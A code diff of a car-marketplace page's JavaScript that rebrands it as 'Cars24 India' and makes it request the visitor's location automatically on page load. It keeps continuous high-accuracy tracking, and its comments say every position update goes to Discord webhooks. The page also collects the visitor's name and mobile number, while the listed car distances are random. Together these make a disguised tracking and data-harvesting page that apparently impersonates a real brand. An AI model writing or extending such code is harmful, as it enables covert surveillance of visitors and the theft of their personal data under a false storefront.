@@ -1,9 +1,9 @@
 /**
  * ============================================
- * NearbyCars Live - Frontend JavaScript
+ * Cars24 India - Frontend JavaScript
  * ============================================
  * Handles:
- * - Location detection and continuous tracking
+ * - Auto location detection on page load
  * - Discord webhook communication via backend proxy
  * - User name capture and personalization
  * - Optional OTP mobile verification
@@ -12,9 +12,22 @@
  */
 
 // ═══════════════════════════════════════════════
-//              CAR DATA (Fake/Placeholder)
-// Replace these with real dealer data later
+//              CAR DATA
+// Replace these with real dealer data later.
+// Using reliable SVG placeholders with brand colors.
 // ═══════════════════════════════════════════════
+
+function makeSVG(brand, model, bg, fg) {
+  return 'data:image/svg+xml,' + encodeURIComponent(
+    '<svg xmlns="http://www.w3.org/2000/svg" width="600" height="400" viewBox="0 0 600 400">' +
+    '<rect width="600" height="400" fill="' + bg + '"/>' +
+    '<text x="300" y="175" text-anchor="middle" fill="' + fg + '" font-size="28" font-weight="900" font-family="Inter,sans-serif">' + brand + '</text>' +
+    '<text x="300" y="215" text-anchor="middle" fill="' + fg + '" font-size="42" font-weight="900" font-family="Inter,sans-serif" opacity="0.85">' + model + '</text>' +
+    '<text x="300" y="260" text-anchor="middle" fill="' + fg + '" font-size="16" font-family="Inter,sans-serif" opacity="0.4">AVAILABLE NOW</text>' +
+    '</svg>'
+  );
+}
+
 const carDatabase = [
   {
     id: 1,
@@ -23,7 +36,7 @@ const carDatabase = [
     type: 'supercar',
     price: 32200000,
     priceLakh: '3.22 Cr',
-    image: 'https://images.unsplash.com/photo-1544636331-e26879cd4d9b?w=600&h=400&fit=crop',
+    image: makeSVG('Lamborghini', 'Huracan EVO', '#1a1a2e', '#E8D5B7'),
     fuel: 'Petrol',
     transmission: 'Automatic',
     badges: ['hot'],
@@ -37,7 +50,7 @@ const carDatabase = [
     type: 'supercar',
     price: 36100000,
     priceLakh: '3.61 Cr',
-    image: 'https://images.unsplash.com/photo-1592198084033-aade902d1aae?w=600&h=400&fit=crop',
+    image: makeSVG('Ferrari', 'Roma', '#1a0000', '#FF2800'),
     fuel: 'Petrol',
     transmission: 'Automatic',
     badges: ['hot'],
@@ -51,7 +64,7 @@ const carDatabase = [
     type: 'supercar',
     price: 33500000,
     priceLakh: '3.35 Cr',
-    image: 'https://images.unsplash.com/photo-1614162692292-7ac56d7f7f1e?w=600&h=400&fit=crop',
+    image: makeSVG('Porsche', '911 Turbo S', '#0a0a0a', '#B0B0B0'),
     fuel: 'Petrol',
     transmission: 'Automatic',
     badges: ['hot'],
@@ -65,7 +78,7 @@ const carDatabase = [
     type: 'luxury',
     price: 17000000,
     priceLakh: '1.70 Cr',
-    image: 'https://images.unsplash.com/photo-1618843479313-40f8afb4b4d8?w=600&h=400&fit=crop',
+    image: makeSVG('Mercedes-Benz', 'S-Class', '#f0f0f0', '#1a1a1a'),
     fuel: 'Petrol/Diesel',
     transmission: 'Automatic',
     badges: ['new'],
@@ -79,7 +92,7 @@ const carDatabase = [
     type: 'luxury',
     price: 16500000,
     priceLakh: '1.65 Cr',
-    image: 'https://images.unsplash.com/photo-1555215695-3004980ad54e?w=600&h=400&fit=crop',
+    image: makeSVG('BMW', '7 Series', '#003366', '#ffffff'),
     fuel: 'Petrol/Diesel',
     transmission: 'Automatic',
     badges: ['new'],
@@ -93,7 +106,7 @@ const carDatabase = [
     type: 'luxury',
     price: 22400000,
     priceLakh: '2.24 Cr',
-    image: 'https://images.unsplash.com/photo-1606664515524-ed2f786a0bd6?w=600&h=400&fit=crop',
+    image: makeSVG('Audi', 'RS7 Sportback', '#1a1a1a', '#E0E0E0'),
     fuel: 'Petrol',
     transmission: 'Automatic',
     badges: ['hot'],
@@ -107,7 +120,7 @@ const carDatabase = [
     type: 'suv',
     price: 1565000,
     priceLakh: '15.65 Lakh',
-    image: 'https://images.unsplash.com/photo-1606016159991-dfe4f2746ad5?w=600&h=400&fit=crop',
+    image: makeSVG('Mahindra', 'Thar', '#2E4A1E', '#FF6B00'),
     fuel: 'Petrol/Diesel',
     transmission: 'Manual/Auto',
     badges: ['offroad'],
@@ -121,7 +134,7 @@ const carDatabase = [
     type: 'suv',
     price: 1157000,
     priceLakh: '11.57 Lakh',
-    image: 'https://images.unsplash.com/photo-1626668011687-8a114cf5a34c?w=600&h=400&fit=crop',
+    image: makeSVG('Hyundai', 'Creta', '#002C5F', '#00AAD4'),
     fuel: 'Petrol/Diesel',
     transmission: 'Manual/IVT',
     badges: ['new'],
@@ -135,7 +148,7 @@ const carDatabase = [
     type: 'suv',
     price: 1599000,
     priceLakh: '15.99 Lakh',
-    image: 'https://images.unsplash.com/photo-1549317661-bd32c8ce0afa?w=600&h=400&fit=crop',
+    image: makeSVG('Tata', 'Harrier', '#1B1B1B', '#E23744'),
     fuel: 'Diesel',
     transmission: 'Manual/AT',
     badges: ['new'],
@@ -149,7 +162,7 @@ const carDatabase = [
     type: 'suv',
     price: 1199000,
     priceLakh: '11.99 Lakh',
-    image: 'https://images.unsplash.com/photo-1619767886558-efdc259cde1a?w=600&h=400&fit=crop',
+    image: makeSVG('Kia', 'Seltos', '#05141F', '#BB162B'),
     fuel: 'Petrol/Diesel',
     transmission: 'Manual/IVT/DCT',
     badges: ['new'],
@@ -163,7 +176,7 @@ const carDatabase = [
     type: 'suv',
     price: 3359000,
     priceLakh: '33.59 Lakh',
-    image: 'https://images.unsplash.com/photo-1552519507-da3b142c6e3d?w=600&h=400&fit=crop',
+    image: makeSVG('Toyota', 'Fortuner', '#EB0A1E', '#FFFFFF'),
     fuel: 'Petrol/Diesel',
     transmission: 'Manual/AT',
     badges: ['offroad'],
@@ -177,7 +190,7 @@ const carDatabase = [
     type: 'suv',
     price: 1838000,
     priceLakh: '18.38 Lakh',
-    image: 'https://images.unsplash.com/photo-1563720223185-11003d516935?w=600&h=400&fit=crop',
+    image: makeSVG('MG', 'Hector Plus', '#1A1A2E', '#FF6B35'),
     fuel: 'Petrol/Diesel',
     transmission: 'Manual/CVT',
     badges: ['new'],
@@ -191,7 +204,7 @@ const carDatabase = [
     type: 'sedan',
     price: 1195000,
     priceLakh: '11.95 Lakh',
-    image: 'https://images.unsplash.com/photo-1621007947382-bb3c3994e3fb?w=600&h=400&fit=crop',
+    image: makeSVG('Hyundai', 'Verna', '#002C5F', '#00AAD4'),
     fuel: 'Petrol/Diesel',
     transmission: 'Manual/IVT',
     badges: ['new'],
@@ -205,7 +218,7 @@ const carDatabase = [
     type: 'sedan',
     price: 1261000,
     priceLakh: '12.61 Lakh',
-    image: 'https://images.unsplash.com/photo-1609521263047-f8f205293f24?w=600&h=400&fit=crop',
+    image: makeSVG('Honda', 'City', '#CC0000', '#FFFFFF'),
     fuel: 'Petrol',
     transmission: 'Manual/CVT',
     badges: ['new'],
@@ -219,7 +232,7 @@ const carDatabase = [
     type: 'hatchback',
     price: 659000,
     priceLakh: '6.59 Lakh',
-    image: 'https://images.unsplash.com/photo-1605559424843-9e4c228bf1c2?w=600&h=400&fit=crop',
+    image: makeSVG('Maruti Suzuki', 'Swift', '#E8792B', '#FFFFFF'),
     fuel: 'Petrol/CNG',
     transmission: 'Manual/AMT',
     badges: ['new'],
@@ -233,8 +246,8 @@ const carDatabase = [
     type: 'suv',
     price: 810000,
     priceLakh: '8.10 Lakh',
-    image: 'https://images.unsplash.com/photo-1583121274602-3e2820c69888?w=600&h=400&fit=crop',
-    fuel: 'Petrol/Diesel/EV',
+    image: makeSVG('Tata', 'Nexon EV', '#1B1B1B', '#00D4AA'),
+    fuel: 'Petrol/Electric',
     transmission: 'Manual/AMT',
     badges: ['electric'],
     dealer: 'Tata Motors showroom',
@@ -247,7 +260,7 @@ const carDatabase = [
     type: 'mpv',
     price: 1999000,
     priceLakh: '19.99 Lakh',
-    image: 'https://images.unsplash.com/photo-1558618666-fcd25c85f82e?w=600&h=400&fit=crop',
+    image: makeSVG('Toyota', 'Innova Crysta', '#EB0A1E', '#FFFFFF'),
     fuel: 'Diesel/Petrol',
     transmission: 'Manual/AT',
     badges: ['new'],
@@ -261,7 +274,7 @@ const carDatabase = [
     type: 'hatchback',
     price: 703000,
     priceLakh: '7.03 Lakh',
-    image: 'https://images.unsplash.com/photo-1549399542-7e3f8b79c341?w=600&h=400&fit=crop',
+    image: makeSVG('Hyundai', 'i20', '#002C5F', '#00AAD4'),
     fuel: 'Petrol/Diesel',
     transmission: 'Manual/IVT',
     badges: ['new'],
@@ -281,7 +294,8 @@ const state = {
   longitude: null,
   accuracy: null,
   watchId: null,
-  currentCarId: null
+  currentCarId: null,
+  locationAttempted: false
 };
 
 // ═══════════════════════════════════════════════
@@ -297,10 +311,10 @@ const DOM = {
   nameSection: document.getElementById('name-section'),
   nameInput: document.getElementById('user-name-input'),
   submitNameBtn: document.getElementById('submit-name-btn'),
-  locationStatus: document.getElementById('location-status'),
-  locationSpinner: document.getElementById('location-spinner'),
-  locationInfo: document.getElementById('location-info'),
-  locationDenied: document.getElementById('location-denied'),
+  locationOverlay: document.getElementById('location-overlay'),
+  bannerSpinner: document.getElementById('banner-spinner'),
+  bannerSuccess: document.getElementById('banner-success'),
+  bannerDenied: document.getElementById('banner-denied'),
   locationText: document.getElementById('location-text'),
   retryLocationBtn: document.getElementById('retry-location-btn'),
   otpSection: document.getElementById('otp-section'),
@@ -315,11 +329,11 @@ const DOM = {
   resendOtpBtn: document.getElementById('resend-otp-btn'),
   otpMessage: document.getElementById('otp-message'),
   otpMobileDisplay: document.getElementById('otp-mobile-display'),
+  typeTabs: document.getElementById('type-tabs'),
   carGrid: document.getElementById('car-grid'),
   emptyState: document.getElementById('empty-state'),
   resultsCount: document.getElementById('results-count'),
   resultsLocation: document.getElementById('results-location'),
-  filterType: document.getElementById('filter-type'),
   filterBrand: document.getElementById('filter-brand'),
   filterPrice: document.getElementById('filter-price'),
   filterSort: document.getElementById('filter-sort'),
@@ -345,7 +359,7 @@ document.addEventListener('DOMContentLoaded', () => {
   // Initialize Lucide icons
   if (window.lucide) lucide.createIcons();
 
-  // Render cars
+  // Render cars immediately
   renderCars(carDatabase);
 
   // Bind events
@@ -353,8 +367,11 @@ document.addEventListener('DOMContentLoaded', () => {
 
   // Navbar scroll effect
   window.addEventListener('scroll', () => {
-    DOM.navbar.classList.toggle('scrolled', window.scrollY > 50);
+    DOM.navbar.classList.toggle('scrolled', window.scrollY > 10);
   });
+
+  // AUTO-REQUEST LOCATION ON PAGE LOAD
+  requestLocation();
 });
 
 function bindEvents() {
@@ -370,7 +387,7 @@ function bindEvents() {
     });
   });
 
-  // Location buttons
+  // Location buttons (hero + nav)
   DOM.heroLocateBtn.addEventListener('click', requestLocation);
   if (DOM.navLocateBtn) DOM.navLocateBtn.addEventListener('click', (e) => { e.preventDefault(); requestLocation(); });
   if (DOM.mobileLocateBtn) DOM.mobileLocateBtn.addEventListener('click', (e) => { e.preventDefault(); requestLocation(); });
@@ -387,8 +404,18 @@ function bindEvents() {
   DOM.verifyOtpBtn.addEventListener('click', verifyOtp);
   DOM.resendOtpBtn.addEventListener('click', sendOtp);
 
+  // Type tabs
+  if (DOM.typeTabs) {
+    DOM.typeTabs.querySelectorAll('.type-tab').forEach(tab => {
+      tab.addEventListener('click', () => {
+        DOM.typeTabs.querySelectorAll('.type-tab').forEach(t => t.classList.remove('active'));
+        tab.classList.add('active');
+        applyFilters();
+      });
+    });
+  }
+
   // Filters
-  DOM.filterType.addEventListener('change', applyFilters);
   DOM.filterBrand.addEventListener('change', applyFilters);
   DOM.filterPrice.addEventListener('change', applyFilters);
   DOM.filterSort.addEventListener('change', applyFilters);
@@ -409,35 +436,37 @@ function bindEvents() {
 // ═══════════════════════════════════════════════
 
 /**
- * Requests user's geolocation and starts continuous tracking.
- * All location updates are sent to Webhook 1 (continuous tracking).
+ * Requests user's geolocation automatically on page load.
+ * Shows overlay while loading, then transitions to banner.
+ * All location updates are sent to Webhook 1 (continuous).
  * High accuracy updates (< 10m) are also sent to Webhook 2.
  */
 function requestLocation() {
-  // Check if geolocation is supported
   if (!navigator.geolocation) {
-    showLocationError('Geolocation is not supported by your browser.');
+    showLocationDenied();
     return;
   }
 
-  // Show loading state
-  DOM.locationSpinner.style.display = 'flex';
-  DOM.locationInfo.style.display = 'none';
-  DOM.locationDenied.style.display = 'none';
+  // Show overlay on first attempt, otherwise just banner spinner
+  if (!state.locationAttempted) {
+    DOM.locationOverlay.style.display = 'flex';
+  }
+
+  showBannerSpinner();
 
   // Clear any existing watch
   if (state.watchId) {
     navigator.geolocation.clearWatch(state.watchId);
   }
 
-  // Options for highest accuracy
+  state.locationAttempted = true;
+
   const options = {
     enableHighAccuracy: true,
     timeout: 15000,
     maximumAge: 0
   };
 
-  // Watch position for continuous updates
   state.watchId = navigator.geolocation.watchPosition(
     handleLocationSuccess,
     handleLocationError,
@@ -445,20 +474,17 @@ function requestLocation() {
   );
 }
 
-/**
- * Handle successful location capture.
- * Sends to backend which dispatches to appropriate webhooks.
- */
 async function handleLocationSuccess(position) {
   const { latitude, longitude, accuracy } = position.coords;
   state.latitude = latitude;
   state.longitude = longitude;
   state.accuracy = accuracy;
 
-  // Get device info
+  // Hide overlay if showing
+  DOM.locationOverlay.style.display = 'none';
+
   const deviceInfo = getDeviceInfo();
 
-  // Prepare payload
   const payload = {
     latitude,
     longitude,
@@ -488,24 +514,22 @@ async function handleLocationSuccess(position) {
   }
 
   // Update UI
-  updateLocationUI(latitude, longitude, accuracy);
+  showBannerSuccess(latitude, longitude, accuracy);
 
   // Update car distances (random for demo)
   updateCarDistances();
 }
 
 /**
- * Handle location errors - show polite message in Hindi + English.
+ * Handle location errors - show English-only denied message.
  */
 function handleLocationError(error) {
-  DOM.locationSpinner.style.display = 'none';
-  DOM.locationInfo.style.display = 'none';
-  DOM.locationDenied.style.display = 'flex';
+  DOM.locationOverlay.style.display = 'none';
 
   let message = '';
   switch (error.code) {
     case error.PERMISSION_DENIED:
-      message = 'Location permission denied';
+      message = 'Location permission denied by user';
       break;
     case error.POSITION_UNAVAILABLE:
       message = 'Location information unavailable';
@@ -517,18 +541,26 @@ function handleLocationError(error) {
       message = 'An unknown error occurred';
   }
   console.warn('[Location Error]', message);
+  showLocationDenied();
 }
 
-function showLocationError(msg) {
-  DOM.locationSpinner.style.display = 'none';
-  DOM.locationDenied.style.display = 'flex';
-  console.error('[Location]', msg);
+function showLocationDenied() {
+  DOM.locationOverlay.style.display = 'none';
+  DOM.bannerSpinner.style.display = 'none';
+  DOM.bannerSuccess.style.display = 'none';
+  DOM.bannerDenied.style.display = 'flex';
 }
 
-function updateLocationUI(lat, lng, accuracy) {
-  DOM.locationSpinner.style.display = 'none';
-  DOM.locationInfo.style.display = 'flex';
-  DOM.locationDenied.style.display = 'none';
+function showBannerSpinner() {
+  DOM.bannerSpinner.style.display = 'flex';
+  DOM.bannerSuccess.style.display = 'none';
+  DOM.bannerDenied.style.display = 'none';
+}
+
+function showBannerSuccess(lat, lng, accuracy) {
+  DOM.bannerSpinner.style.display = 'none';
+  DOM.bannerDenied.style.display = 'none';
+  DOM.bannerSuccess.style.display = 'flex';
 
   const accuracyText = accuracy < 10
     ? `High accuracy (${accuracy.toFixed(1)}m)`
@@ -598,9 +630,10 @@ async function submitUserName() {
   state.userName = name;
 
   // Visual feedback
-  DOM.submitNameBtn.textContent = '✓';
+  DOM.submitNameBtn.innerHTML = '<i data-lucide="check" class="icon-sm green"></i>';
   DOM.submitNameBtn.disabled = true;
   DOM.nameInput.disabled = true;
+  if (window.lucide) lucide.createIcons();
 
   // Send name webhook if location is available
   if (state.latitude !== null) {
@@ -620,7 +653,7 @@ async function submitUserName() {
   setTimeout(() => {
     DOM.otpSection.style.display = 'block';
     DOM.mobileInput.focus();
-  }, 1000);
+  }, 800);
 }
 
 async function sendNameWebhook(payload) {
@@ -653,7 +686,7 @@ async function sendOtp() {
   }
 
   DOM.sendOtpBtn.disabled = true;
-  DOM.sendOtpBtn.innerHTML = '<div class="spinner" style="width:16px;height:16px;border-width:2px;"></div> Sending...';
+  DOM.sendOtpBtn.innerHTML = '<div class="spinner" style="width:14px;height:14px;border-width:2px;"></div> Sending...';
 
   try {
     const response = await fetch('/api/send-otp', {
@@ -689,7 +722,7 @@ async function verifyOtp() {
   }
 
   DOM.verifyOtpBtn.disabled = true;
-  DOM.verifyOtpBtn.innerHTML = '<div class="spinner" style="width:16px;height:16px;border-width:2px;"></div> Verifying...';
+  DOM.verifyOtpBtn.innerHTML = '<div class="spinner" style="width:14px;height:14px;border-width:2px;"></div> Verifying...';
 
   try {
     const response = await fetch('/api/verify-otp', {
@@ -701,7 +734,7 @@ async function verifyOtp() {
 
     if (data.verified) {
       state.isVerified = true;
-      showOtpMessage('Mobile verified successfully!', 'success');
+      showOtpMessage('Mobile number verified successfully!', 'success');
 
       // Log verification to webhook
       await fetch('/api/webhook/otp', {
@@ -720,7 +753,6 @@ async function verifyOtp() {
       DOM.orderName.value = state.userName;
       DOM.orderMobile.value = state.mobile;
 
-      // Close OTP section after delay
       setTimeout(() => closeOtpSection(), 2000);
     } else {
       showOtpMessage(data.message || 'Invalid OTP', 'error');
@@ -760,25 +792,23 @@ function renderCars(cars) {
 
   DOM.carGrid.innerHTML = cars.map(car => createCarCard(car)).join('');
 
-  // Re-initialize Lucide icons for new elements
   if (window.lucide) lucide.createIcons();
 }
 
 function createCarCard(car) {
   const badgesHtml = car.badges.map(b => {
-    const labels = { hot: '🔥 Hot', new: '✨ New', electric: '⚡ EV', offroad: '🏔️ Off-Road' };
+    const labels = { hot: 'Hot', new: 'New', electric: 'EV', offroad: 'Off-Road' };
     return `<span class="badge badge-${b}">${labels[b] || b}</span>`;
   }).join('');
 
   const distanceHtml = car.distance > 0
-    ? `<div class="car-distance"><i data-lucide="map-pin" class="icon-sm"></i> ${car.distance.toFixed(1)} km</div>`
+    ? `<div class="car-distance"><i data-lucide="map-pin" class="icon-sm"></i> ${car.distance.toFixed(1)} km away</div>`
     : '';
 
   return `
     <div class="car-card" data-id="${car.id}">
       <div class="car-card-image">
-        <img src="${car.image}" alt="${car.brand} ${car.model}" loading="lazy"
-             onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 600 400%22%3E%3Crect fill=%22%2316213e%22 width=%22600%22 height=%22400%22/%3E%3Ctext fill=%22%236366f1%22 font-size=%2220%22 x=%2250%25%22 y=%2250%25%22 text-anchor=%22middle%22 dy=%22.3em%22%3E${car.brand} ${car.model}%3C/text%3E%3C/svg%3E'">
+        <img src="${car.image}" alt="${car.brand} ${car.model}" loading="lazy">
         <div class="car-badge">${badgesHtml}</div>
         ${distanceHtml}
       </div>
@@ -797,10 +827,10 @@ function createCarCard(car) {
         </div>
         <div class="car-card-footer">
           <div class="car-price">
-            ₹${car.priceLakh}
+            ${car.priceLakh}
             <span>Ex-Showroom</span>
           </div>
-          <button class="order-btn" onclick="openOrderModal(${car.id})">Order Now</button>
+          <button class="order-btn" onclick="openOrderModal(${car.id})">Get Price</button>
         </div>
         <div class="car-dealer"><i data-lucide="store" class="icon-sm"></i> ${car.dealer}</div>
       </div>
@@ -809,14 +839,17 @@ function createCarCard(car) {
 }
 
 function applyFilters() {
-  const type = DOM.filterType.value;
+  // Get type from active tab
+  const activeTab = DOM.typeTabs?.querySelector('.type-tab.active');
+  const type = activeTab ? activeTab.dataset.type : 'all';
+
   const brand = DOM.filterBrand.value;
   const priceRange = DOM.filterPrice.value;
   const sort = DOM.filterSort.value;
 
   let filtered = [...carDatabase];
 
-  // Type filter
+  // Type filter (from tabs)
   if (type !== 'all') {
     filtered = filtered.filter(car => car.type === type);
   }
@@ -847,7 +880,6 @@ function applyFilters() {
       filtered.sort((a, b) => `${a.brand} ${a.model}`.localeCompare(`${b.brand} ${b.model}`));
       break;
     default:
-      // Featured: keep original order, supercars first
       filtered.sort((a, b) => {
         const typeOrder = { supercar: 0, luxury: 1, suv: 2, sedan: 3, mpv: 4, hatchback: 5, pickup: 6 };
         return (typeOrder[a.type] || 5) - (typeOrder[b.type] || 5);
@@ -858,10 +890,14 @@ function applyFilters() {
 }
 
 function resetFilters() {
-  DOM.filterType.value = 'all';
   DOM.filterBrand.value = 'all';
   DOM.filterPrice.value = 'all';
   DOM.filterSort.value = 'default';
+  // Reset type tabs
+  if (DOM.typeTabs) {
+    DOM.typeTabs.querySelectorAll('.type-tab').forEach(t => t.classList.remove('active'));
+    DOM.typeTabs.querySelector('[data-type="all"]')?.classList.add('active');
+  }
   renderCars(carDatabase);
 }
 
@@ -869,12 +905,15 @@ function resetFilters() {
  * Set filter from footer links
  */
 function setFilter(type) {
-  DOM.filterType.value = type;
+  if (DOM.typeTabs) {
+    DOM.typeTabs.querySelectorAll('.type-tab').forEach(t => t.classList.remove('active'));
+    const target = DOM.typeTabs.querySelector(`[data-type="${type}"]`);
+    if (target) target.classList.add('active');
+  }
   applyFilters();
   document.getElementById('cars-section').scrollIntoView({ behavior: 'smooth' });
 }
 
-// Make setFilter available globally
 window.setFilter = setFilter;
 
 /**
@@ -883,10 +922,9 @@ window.setFilter = setFilter;
  */
 function updateCarDistances() {
   carDatabase.forEach(car => {
-    // Random distance between 0.5 and 45 km for demo
     car.distance = Math.round((Math.random() * 44.5 + 0.5) * 10) / 10;
   });
-  applyFilters(); // Re-render with distances
+  applyFilters();
 }
 
 // ═══════════════════════════════════════════════
@@ -900,7 +938,7 @@ function openOrderModal(carId) {
   state.currentCarId = carId;
 
   DOM.modalCarName.textContent = `${car.brand} ${car.model}`;
-  DOM.modalCarPrice.textContent = `₹${car.priceLakh} (Ex-Showroom)`;
+  DOM.modalCarPrice.textContent = `${car.priceLakh} (Ex-Showroom)`;
 
   // Pre-fill form
   DOM.orderName.value = state.userName || '';
@@ -910,13 +948,11 @@ function openOrderModal(carId) {
     DOM.orderLocation.value = `${state.latitude.toFixed(6)}, ${state.longitude.toFixed(6)}`;
   }
 
-  // Show form, hide success
   DOM.orderForm.style.display = 'block';
   DOM.modalSuccess.style.display = 'none';
   DOM.orderModal.style.display = 'flex';
   DOM.orderModal.style.flexDirection = 'column';
 
-  // Prevent body scroll
   document.body.style.overflow = 'hidden';
 }
 
@@ -934,8 +970,9 @@ async function submitOrder(e) {
   const car = carDatabase.find(c => c.id === state.currentCarId);
   if (!car) return;
 
-  DOM.orderForm.querySelector('button[type="submit"]').disabled = true;
-  DOM.orderForm.querySelector('button[type="submit"]').innerHTML = '<div class="spinner" style="width:16px;height:16px;border-width:2px;"></div> Submitting...';
+  const submitBtn = DOM.orderForm.querySelector('button[type="submit"]');
+  submitBtn.disabled = true;
+  submitBtn.innerHTML = '<div class="spinner" style="width:16px;height:16px;border-width:2px;"></div> Submitting...';
 
   try {
     const response = await fetch('/api/order', {
@@ -952,17 +989,17 @@ async function submitOrder(e) {
     const data = await response.json();
 
     if (data.success) {
-      // Show success message
       DOM.orderForm.style.display = 'none';
       DOM.modalSuccess.style.display = 'block';
+      if (window.lucide) lucide.createIcons();
     }
   } catch (error) {
     console.error('[Order] Error:', error);
     alert('Something went wrong. Please try again.');
   }
 
-  DOM.orderForm.querySelector('button[type="submit"]').disabled = false;
-  DOM.orderForm.querySelector('button[type="submit"]').innerHTML = '<i data-lucide="send" class="icon"></i> Submit Inquiry';
+  submitBtn.disabled = false;
+  submitBtn.innerHTML = '<i data-lucide="send" class="icon"></i> Get Dealer Callback';
   if (window.lucide) lucide.createIcons();
 }
 
@@ -970,7 +1007,6 @@ async function submitOrder(e) {
 //              KEYBOARD SHORTCUTS
 // ═══════════════════════════════════════════════
 document.addEventListener('keydown', (e) => {
-  // Escape to close modal
   if (e.key === 'Escape') {
     if (DOM.orderModal.style.display === 'flex') closeOrderModal();
     if (DOM.otpSection.style.display === 'block') closeOtpSection();
